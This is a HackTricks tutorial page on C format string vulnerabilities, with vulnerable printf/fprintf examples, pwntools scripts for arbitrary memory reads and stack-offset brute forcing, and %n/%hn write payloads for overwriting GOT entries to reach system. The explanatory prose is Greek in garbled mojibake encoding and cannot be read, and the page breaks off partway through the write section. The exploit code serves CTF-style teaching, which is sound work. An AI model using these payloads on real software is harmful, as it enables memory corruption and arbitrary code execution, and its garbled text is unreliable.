# Format Strings

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Î£Ï„Î·Î½ C **`printf`** ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± **ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÎ¹** ÎºÎ¬Ï€Î¿Î¹Î¿ ÎºÎµÎ¯Î¼ÎµÎ½Î¿. Î— **Ï€ÏÏÏ„Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î¼Î­Î½ÎµÎ¹ Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **Î±ÎºÎ±Ï„Î­ÏÎ³Î±ÏƒÏ„Î¿ ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Îµ Ï„Î¿Ï…Ï‚ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹Î·Ï„Î­Ï‚**. ÎŸÎ¹ **ÎµÏ€ÏŒÎ¼ÎµÎ½ÎµÏ‚ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹** Ï€Î¿Ï… Î±Î½Î±Î¼Î­Î½Î¿Î½Ï„Î±Î¹ ÎµÎ¯Î½Î±Î¹ Î¿Î¹ **Ï„Î¹Î¼Î­Ï‚** Î³Î¹Î± Î½Î± **Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î½** Ï„Î¿Ï…Ï‚ **Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹Î·Ï„Î­Ï‚** Î±Ï€ÏŒ Ï„Î¿ Î±ÎºÎ±Ï„Î­ÏÎ³Î±ÏƒÏ„Î¿ ÎºÎµÎ¯Î¼ÎµÎ½Î¿.

Î†Î»Î»ÎµÏ‚ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ Î¿Î¹ **`sprintf()`** ÎºÎ±Î¹ **`fprintf()`**.

Î— ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ ÏŒÏ„Î±Î½ Î­Î½Î± **ÎºÎµÎ¯Î¼ÎµÎ½Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï‰Ï‚ Î· Ï€ÏÏÏ„Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚** ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± **ÎµÎ¹Î´Î¹ÎºÎ® ÎµÎ¯ÏƒÎ¿Î´Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚** Ï„Î¹Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Ï„Î·Ï‚ **Î¼Î¿ÏÏ†Î®Ï‚ printf** Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± **Î³ÏÎ¬ÏˆÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· (Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î·/Î³ÏÎ±Ï€Ï„Î®)**. ÎˆÏ‡Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ±**.

#### Formatters:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%p â€”> Pointer
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±:**

* Î•Ï…Î¬Î»Ï‰Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* ÎšÎ±Î½Î¿Î½Î¹ÎºÎ® Î§ÏÎ®ÏƒÎ·:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* ÎœÎµ Î•Î»Î»ÎµÎ¯Ï€Î¿Î½Ï„ÎµÏ‚ Î Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
* fprintf ÎµÏ…Î¬Î»Ï‰Ï„Î¿:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input cna include formatters!
fclose(output_file);
return 0;
}
```
### **Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î”ÎµÎ¯ÎºÏ„ÎµÏ‚**

Î— Î¼Î¿ÏÏ†Î® **`%<n>$x`**, ÏŒÏ€Î¿Ï… `n` ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚, ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ ÏƒÏ„Î¿ printf Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÎ¹ Ï„Î·Î½ n Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ (Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î±). ÎˆÏ„ÏƒÎ¹, Î±Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î·Î½ 4Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î±Ï€ÏŒ Ï„Î· ÏƒÏ„Î¿Î¯Î²Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ printf, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ:
```c
printf("%x %x %x %x")
```
ÎºÎ±Î¹ Î¸Î± Î´Î¹Î±Î²Î¬Î¶Î±Ï„Îµ Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÏÏ„Î· Î­Ï‰Ï‚ Ï„Î·Î½ Ï„Î­Ï„Î±ÏÏ„Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿.

Î‰ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ:
```c
printf("$4%x")
```
ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï„Î¿ Ï„Î­Ï„Î±ÏÏ„Î¿.

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `pr`**`intf`**, Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹** Î· ÎµÎ¯ÏƒÎ¿Î´ÏŒÏ‚ Ï„Î¿Ï… Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÏŒÏ„Î±Î½ ÎºÎ»Î·Î¸ÎµÎ¯ Ï„Î¿ `printf`, Ï€Î¿Ï… ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Î¼Î½Î®Î¼Î·Ï‚ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±.

{% hint style="danger" %}
ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿, Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÎºÎ±Î¹ Î½Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î¿ `printf` Î½Î± Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎµÎ¹**. Î£Ï„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± Î¸Î± ÎµÎ¾Î·Î³Î·Î¸ÎµÎ¯ Ï€ÏÏ‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬.
{% endhint %}

## **Î‘Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î‘Î½Î¬Î³Î½Ï‰ÏƒÎ·**

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹Î·Ï„Î® **`%n$s`** Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ **`printf`** Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î· **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·** Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î· **n Î¸Î­ÏƒÎ·**, Î±ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ±Î¹ **Î½Î± Ï„Î·Î½ ÎµÎºÏ„Ï…Ï€ÏÏƒÎµÎ¹ ÏƒÎ±Î½ Î½Î± Î®Ï„Î±Î½ Î¼Î¹Î± ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬** (ÎµÎºÏ„ÏÏ€Ï‰ÏƒÎ· Î¼Î­Ï‡ÏÎ¹ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Î­Î½Î± 0x00). ÎˆÏ„ÏƒÎ¹, Î±Î½ Î· Î²Î±ÏƒÎ¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… Î´Ï…Î±Î´Î¹ÎºÎ¿Ï ÎµÎ¯Î½Î±Î¹ **`0x8048000`**, ÎºÎ±Î¹ Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î¾ÎµÎºÎ¹Î½Î¬ ÏƒÏ„Î· 4Î· Î¸Î­ÏƒÎ· ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÏ„Ï…Ï€Ï‰Î¸ÎµÎ¯ Î· Î±ÏÏ‡Î® Ï„Î¿Ï… Î´Ï…Î±Î´Î¹ÎºÎ¿Ï Î¼Îµ:
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²Î¬Î»ÎµÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· 0x8048000 ÏƒÏ„Î·Î½ Î±ÏÏ‡Î® Ï„Î·Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… Î³Î¹Î±Ï„Î¯ Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ Î¸Î± ÎºÎ¿Ï€ÎµÎ¯ ÏƒÏ„Î¿ 0x00 ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚ Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚.
{% endhint %}

### Î’ÏÎµÎ¯Ï„Îµ Ï„Î·Î½ Î±Ï€ÏŒÏƒÏ„Î±ÏƒÎ·

Î“Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î·Î½ Î±Ï€ÏŒÏƒÏ„Î±ÏƒÎ· ÏƒÏ„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´ÏŒ ÏƒÎ±Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ 4 Î® 8 bytes (`0x41414141`) Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î± Î±Ï€ÏŒ **`%1$x`** ÎºÎ±Î¹ **Î½Î± Î±Ï…Î¾Î®ÏƒÎµÏ„Îµ** Ï„Î·Î½ Ï„Î¹Î¼Î® Î¼Î­Ï‡ÏÎ¹ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î± `A's`.

<details>

<summary>Brute Force printf offset</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### Î ÏŒÏƒÎ¿ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿

ÎŸÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„ÎµÏ‚ Î±Î½Î±Î³Î½ÏÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Î³Î¹Î±:

* **Dump** Ï„Î¿ **binary** Î±Ï€ÏŒ Ï„Î· Î¼Î½Î®Î¼Î·
* **Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Î¼Î­ÏÎ· Ï„Î·Ï‚ Î¼Î½Î®Î¼Î·Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î·** **Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î±** (ÏŒÏ€Ï‰Ï‚ canaries, ÎºÎ»ÎµÎ¹Î´Î¹Î¬ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ Î® Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏŒÏ€Ï‰Ï‚ ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**CTF Ï€ÏÏŒÎºÎ»Î·ÏƒÎ·**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value))

## **Î‘Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î•Î³Î³ÏÎ±Ï†Î®**

ÎŸ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ **`$<num>%n`** **Î³ÏÎ¬Ï†ÎµÎ¹** Ï„Î¿Î½ **Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Ï‰Î½ Î³ÏÎ±Î¼Î¼Î­Î½Ï‰Î½ byte** ÏƒÏ„Î· **Î´ÎµÎ¹ÎºÎ½Ï…ÏŒÎ¼ÎµÎ½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·** ÏƒÏ„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ \<num> ÏƒÏ„Î¿ stack. Î•Î¬Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ ÏŒÏƒÎ¿Ï…Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Î¸Î­Î»ÎµÎ¹ Î¼Îµ Ï„Î¿ printf, Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎºÎ¬Î½ÎµÎ¹ **`$<num>%n`** Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Î­Î½Î±Î½ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ ÏƒÎµ Î¼Î¹Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·.

Î•Ï…Ï„Ï…Ï‡ÏÏ‚, Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ 9999, Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ 9999 "A"s ÏƒÏ„Î·Î½ ÎµÎ¯ÏƒÎ¿Î´Î¿, Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÎ¹ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹Î·Ï„Î® **`%.<num-write>%<num>$n`** Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ **`<num-write>`** ÏƒÏ„Î· **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î· Î¸Î­ÏƒÎ· `num`**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î³Î¹Î± Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `0x08049724` (Î· Î¿Ï€Î¿Î¯Î± ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ ÎœÎ•Î“Î‘Î›ÎŸÎ£ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ Î³Î¹Î± Î½Î± Î³ÏÎ±Ï†Ï„ÎµÎ¯ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î±), **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ `$hn`** Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ `$n`. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î³ÏÎ±Ï†Î¿ÏÎ½ Î¼ÏŒÎ½Î¿ 2 Bytes**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î® Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î´ÏÎ¿ Ï†Î¿ÏÎ­Ï‚, Î¼Î¯Î± Î³Î¹Î± Ï„Î± Ï…ÏˆÎ·Î»ÏŒÏ„ÎµÏÎ± 2B Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î¬Î»Î»Î· Î¼Î¯Î± Î³Î¹Î± Ï„Î± Ï‡Î±Î¼Î·Î»ÏŒÏ„ÎµÏÎ±.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î³ÏÎ±Ï†ÎµÎ¯ Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· (Ï„Ï…Ï‡Î±Î¯Î± ÎµÎ³Î³ÏÎ±Ï†Î®).**

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¿ ÏƒÏ„ÏŒÏ‡Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î½Î± **ÎµÏ€Î¹ÎºÎ±Î»Ï…Ï†Î¸ÎµÎ¯** Î· **Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·** Î¼Î¹Î±Ï‚ **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚** ÏƒÏ„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ± **GOT** Ï€Î¿Ï… Î¸Î± ÎºÎ»Î·Î¸ÎµÎ¯ Î±ÏÎ³ÏŒÏ„ÎµÏÎ±. Î‘Î½ ÎºÎ±Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î¬Î»Î»ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Ï„Ï…Ï‡Î±Î¯Î±Ï‚ ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ·:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

Î˜Î± **ÎµÏ€Î¹ÎºÎ±Î»Ï…Ï†Î¸ÎµÎ¯** Î¼Î¹Î± **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±** Ï€Î¿Ï… **Î»Î±Î¼Î²Î¬Î½ÎµÎ¹** Ï„Î± **Î¿ÏÎ¯ÏƒÎ¼Î±Ï„Î¬** Ï„Î·Ï‚ Î±Ï€ÏŒ Ï„Î¿Î½ **Ï‡ÏÎ®ÏƒÏ„Î·** ÎºÎ±Î¹ Î¸Î± **Î´ÎµÎ¯Î¾ÎµÎ¹** Ï„Î· **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± `system`**.\
ÎŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ, Î³Î¹Î± Î½Î± Î³ÏÎ±Ï†ÎµÎ¯ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ 2 Î²Î®Î¼Î±Ï„Î±: Î ÏÏÏ„Î± **Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Î¹ 2Bytes** Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï„Î± Î¬Î»Î»Î± 2. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ **`$hn`**.

* **HOB** ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î± 2 Ï…ÏˆÎ·Î»ÏŒÏ„ÎµÏÎ± bytes Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚
